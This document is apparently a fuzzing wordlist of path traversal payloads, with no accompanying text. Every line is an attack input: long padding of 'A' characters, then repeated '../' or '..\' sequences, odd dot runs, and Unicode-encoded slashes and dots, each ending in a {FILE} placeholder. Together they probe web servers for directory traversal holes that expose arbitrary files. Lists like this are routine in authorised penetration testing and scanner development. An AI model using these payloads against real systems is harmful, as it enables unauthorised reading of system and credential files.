AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\..\{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\..\..\{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\..\{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\..\..\..\{FILE}
    .../{FILE}
    .../.../{FILE}
    .../.../.../{FILE}
    .../.../.../.../{FILE}
    .../.../.../.../.../{FILE}
    .../.../.../.../.../.../{FILE}
    .../.../.../.../.../.../.../{FILE}
    .../.../.../.../.../.../.../.../{FILE}
    ...\{FILE}
    ...\...\{FILE}
    ...\...\...\{FILE}
    ...\...\...\...\{FILE}
    ...\...\...\...\...\{FILE}
    ...\...\...\...\...\...\{FILE}
    ...\...\...\...\...\...\...\{FILE}
    ...\...\...\...\...\...\...\...\{FILE}
    ..../{FILE}
    ..../..../{FILE}
    ..../..../..../{FILE}
    ..../..../..../..../{FILE}
    ..../..../..../..../..../{FILE}
    ..../..../..../..../..../..../{FILE}
    ..../..../..../..../..../..../..../{FILE}
    ..../..../..../..../..../..../..../..../{FILE}
    ....\{FILE}
    ....\....\{FILE}
    ....\....\....\{FILE}
    ....\....\....\....\{FILE}
    ....\....\....\....\....\{FILE}
    ....\....\....\....\....\....\{FILE}
    ....\....\....\....\....\....\....\{FILE}
    ....\....\....\....\....\....\....\....\{FILE}
    ........................................................................../{FILE}
    ........................................................................../../{FILE}
    ........................................................................../../../{FILE}
    ........................................................................../../../../{FILE}
    ........................................................................../../../../../{FILE}
    ........................................................................../../../../../../{FILE}
    ........................................................................../../../../../../../{FILE}
    ........................................................................../../../../../../../../{FILE}
    ..........................................................................\{FILE}
    ..........................................................................\..\{FILE}
    ..........................................................................\..\..\{FILE}
    ..........................................................................\..\..\..\{FILE}
    ..........................................................................\..\..\..\..\{FILE}
    ..........................................................................\..\..\..\..\..\{FILE}
    ..........................................................................\..\..\..\..\..\..\{FILE}
    ..........................................................................\..\..\..\..\..\..\..\{FILE}
    ..%u2215{FILE}
    ..%u2215..%u2215{FILE}
    ..%u2215..%u2215..%u2215{FILE}
    ..%u2215..%u2215..%u2215..%u2215{FILE}
    ..%u2215..%u2215..%u2215..%u2215..%u2215{FILE}
    ..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215{FILE}
    ..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215{FILE}
    ..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215{FILE}
    %uff0e%uff0e/{FILE}
    %uff0e%uff0e/%uff0e%uff0e/{FILE}
